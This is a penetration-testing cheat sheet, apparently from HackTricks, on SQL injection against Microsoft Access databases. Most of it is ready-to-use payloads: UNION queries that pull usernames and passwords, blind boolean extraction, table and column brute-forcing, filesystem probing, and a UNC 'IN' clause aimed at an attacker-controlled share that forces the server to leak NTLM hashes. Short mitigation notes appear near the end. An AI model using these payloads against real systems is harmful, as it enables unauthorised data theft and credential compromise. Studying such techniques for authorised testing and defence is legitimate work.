_body: "# MS Access SQL Injection\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Online Playground\n\n- [https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format&ss=-1)\n\
  \n## DB Limitations\n\n### String Concatenation\n\nString concatenation is possible with `& (%26)` and `+ (%2b)` characters.\n\
  \n```sql\n1' UNION SELECT 'web' %2b 'app' FROM table%00\n1' UNION SELECT 'web' %26 'app' FROM table%00\n```\n\n### Comments\n\
  \nThere are no comments in MS access, but apparently it's possible to remove the last of a query with a NULL char:\n\n```sql\n\
  1' union select 1,2 from table%00\n```\n\nIf this is not working you could always fix the syntax of the query:\n\n```sql\n\
  1' UNION SELECT 1,2 FROM table WHERE ''='\n```\n\n### Stacked Queries\n\nThey aren't supported.\n\n### LIMIT\n\nThe **`LIMIT`**\
  \ operator **isn't implemented**. However, it's possible to limit SELECT query results to the **first N table rows using\
  \ the `TOP` operator**. `TOP` accepts as argument an integer, representing the number of rows to be returned.\n\n```sql\n\
  1' UNION SELECT TOP 3 attr FROM table%00\n```\n\nJust like TOP you can use **`LAST`** which will get the **rows from the\
  \ end**.\n\n## UNION Queries/Sub queries\n\nIn a SQLi you usually will want to somehow execute a new query to extract information\
  \ from other tables. MS Access always requires that in **subqueries or extra queries a `FROM` is indicated**.\\\nSo, if\
  \ you want to execute a `UNION SELECT` or `UNION ALL SELECT` or a `SELECT` between parenthesis in a condition, you always\
  \ **need to indicate a `FROM` with a valid table name**.\\\nTherefore, you need to know a **valid table name**.\n\n```sql\n\
  -1' UNION SELECT username,password from users%00\n```\n\n### Chaining equals + Substring\n\n> [!WARNING]\n> This will allow\
  \ you to exfiltrate values of the current table without needing to know the name of the table.\n\n**MS Access** allows **weird\
  \ syntax** such as **`'1'=2='3'='asd'=false`**. As usually the SQL injection will be inside a **`WHERE`** clause we can\
  \ abuse that.\n\nImagine you have a SQLi in a MS Access database and you know (or guessed) that one **column name is username**,\
  \ and thats the field you want to **exfiltrate**. You could check the different responses of the web app when the chaining\
  \ equals technique is used and potentially exfiltrate content with a **boolean injection** using the **`Mid`** function\
  \ to get substrings.\n\n```sql\n'=(Mid(username,1,3)='adm')='\n```\n\nIf you know the **name of the table** and **column**\
  \ to dump you can use a combination between `Mid` , `LAST` and `TOP` to **leak all the info** via boolean SQLi:\n\n```sql\n\
  '=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='\n```\n\n_Feel free to check this\
  \ in the online playground._\n\n### Brute-forcing Tables names\n\nUsing the chaining equals technique you can also **bruteforce\
  \ table names** with something like:\n\n```sql\n'=(select+top+1+'lala'+from+<table_name>)='\n```\n\nYou can also use a more\
  \ traditional way:\n\n```sql\n-1' AND (SELECT TOP 1 <table_name>)%00\n```\n\n_Feel free to check this in the online playground._\n\
  \n- Sqlmap common table names: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)\n\
  - There is another list in [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)\n\
  \n### Brute-Forcing Columns names\n\nYou can **brute-force current columns names** with the chaining equals trick with:\n\
  \n```sql\n'=column_name='\n```\n\nOr with a **group by**:\n\n```sql\n-1' GROUP BY column_name%00\n```\n\nOr you can brute-force\
  \ column names of a **different table** with:\n\n```sql\n'=(SELECT TOP 1 column_name FROM valid_table_name)='\n\n-1' AND\
  \ (SELECT TOP 1 column_name FROM valid_table_name)%00\n```\n\n### Dumping data\n\nWe have already discussed the [**chaining\
  \ equals technique**](ms-access-sql-injection.md#chaining-equals-+-substring) **to dump data from the current and other\
  \ tables**. But there are other ways:\n\n```sql\nIIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')\n\
  ```\n\nIn a nutshell, the query uses an “if-then” statement in order to trigger a “200 OK” in case of success or a “500\
  \ Internal Error” otherwise. Taking advantage of the TOP 10 operator, it is possible to select the first ten results. The\
  \ subsequent usage of LAST allows to consider the 10th tuple only. On such value, using the MID operator, it is possible\
  \ to perform a simple character comparison. Properly changing the index of MID and TOP, we can dump the content of the “username”\
  \ field for all rows.\n\n### Time-Based (Blind) Tricks\n\nJet/ACE SQL itself does **not** expose a native `SLEEP()` or `WAITFOR`\
  \ function, so traditional time-based blind injections are limited. However, you can still introduce a measurable delay\
  \ by forcing the engine to access a **network resource that is slow or does not answer**. Because the engine will try to\
  \ open the file before returning the result, the HTTP response time reflects the round-trip latency to the attacker-controlled\
  \ host.\n\n```sql\n' UNION SELECT 1 FROM SomeTable IN '\\\\10.10.14.3\\doesnotexist\\dummy.mdb'--\n```\n\nPoint the UNC\
  \ path to:\n\n* a SMB share behind a high-latency link\n* a host that drops the TCP handshake after `SYN-ACK`\n* a firewall\
  \ sinkhole\n\nThe extra seconds introduced by the remote lookup can be used as an **out-of-band timing oracle** for boolean\
  \ conditions (e.g. pick a slow path only when the injected predicate is true). Microsoft documents the remote database behaviour\
  \ and the associated registry kill-switch in KB5002984. \n\n### Other Interesting functions\n\n- `Mid('admin',1,1)` get\
  \ substring from position 1 length 1 (initial position is 1)\n- `LEN('1234')` get length of string\n- `ASC('A')` get ascii\
  \ value of char\n- `CHR(65)` get string from ascii value\n- `IIF(1=1,'a','b')` if then\n- `COUNT(*)` Count number of items\n\
  \n## Enumerating tables\n\nFrom [**here**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) you can see\
  \ a query to get tables names:\n\n```sql\nselect MSysObjects.name\nfrom MSysObjects\nwhere\n   MSysObjects.type In (1,4,6)\n\
  \   and MSysObjects.name not like '~*'\n   and MSysObjects.name not like 'MSys*'\norder by MSysObjects.name\n```\n\nHowever,\
  \ note that is very typical to find SQL Injections where you **don't have access to read the table `MSysObjects`**.\n\n\
  ## FileSystem access\n\n### Web Root Directory Full Path\n\nThe knowledge of the **web root absolute path may facilitate\
  \ further attacks**. If application errors are not completely concealed, the directory path can be uncovered trying to select\
  \ data from an inexistent database.\n\n`http://localhost/script.asp?id=1'+ '+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`\n\n\
  MS Access responds with an **error message containing the web directory full pathname**.\n\n### File Enumeration\n\nThe\
  \ following attack vector can be used to **inferrer the existence of a file on the remote filesystem**. If the specified\
  \ file exists, MS Access triggers an error message informing that the database format is invalid:\n\n`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\\\
  boot.ini'%00`\n\nAnother way to enumerate files consists into **specifying a database.table item**. **If** the specified\
  \ **file exists**, MS Access displays a **database format error message**.\n\n`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\\\
  boot.ini.TableName%00`\n\n### .mdb File Name Guessing\n\n**Database file name (.mdb)** can be inferred with the following\
  \ query:\n\n`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`\n\nWhere **name[i] is a .mdb filename**\
  \ and **realTable is an existent table** within the database. Although MS Access will always trigger an error message, it\
  \ is possible to distinguish between an invalid filename and a valid .mdb filename.\n\n### Remote Database Access & NTLM\
  \ Credential Theft (2023)\n\nSince Jet 4.0 every query can reference a table located in a *different* `.mdb/.accdb` file\
  \ via the `IN '<path>'` clause:\n\n```sql\nSELECT first_name FROM Employees IN '\\\\server\\share\\hr.accdb';\n```\n\nIf\
  \ user input is concatenated into the part after **IN** (or into a `JOIN … IN` / `OPENROWSET` / `OPENDATASOURCE` call) an\
  \ attacker can specify a **UNC path** that points to a host they control. The engine will:\n\n1. try to authenticate over\
  \ SMB / HTTP to open the remote database; \n2. leak the web-server’s **NTLM credentials** (forced authentication); \n3.\
  \ parse the remote file – a malformed or malicious database can trigger Jet/ACE memory-corruption bugs that have been patched\
  \ multiple times (e.g. CVE-2021-28455).\n\nPractical injection example:\n\n```sql\n1' UNION SELECT TOP 1 name\n   FROM MSysObjects\n\
  \   IN '\\\\attacker\\share\\poc.mdb'-- -\n```\n\nImpact:\n\n* Out-of-band exfiltration of Net-NTLMv2 hashes (usable for\
  \ relay or offline cracking).\n* Potential remote code execution if a new Jet/ACE parser bug is exploited.\n\nMitigations\
  \ (recommended even for legacy Classic ASP apps):\n\n* Add the registry value `AllowQueryRemoteTables = 0` under `HKLM\\\
  Software\\Microsoft\\Jet\\4.0\\Engines` (and under the equivalent ACE path). This forces Jet/ACE to reject remote paths\
  \ starting with `\\\\`.\n* Block outbound SMB/WebDAV at the network boundary.\n* Sanitize / parameterise any part of a query\
  \ that may end up inside an `IN` clause.\n\nThe forced-authentication vector was revisited by Check Point Research in 2023,\
  \ proving it is still exploitable on fully patched Windows Server when the registry key is absent. \n\n### .mdb Password\
  \ Cracker\n\n[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) is a free utility that can be used to recover\
  \ the main database password of Microsoft Access 95/97/2000/XP or Jet Database Engine 3.0/4.0.\n\n## References\n\n- [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)\n\
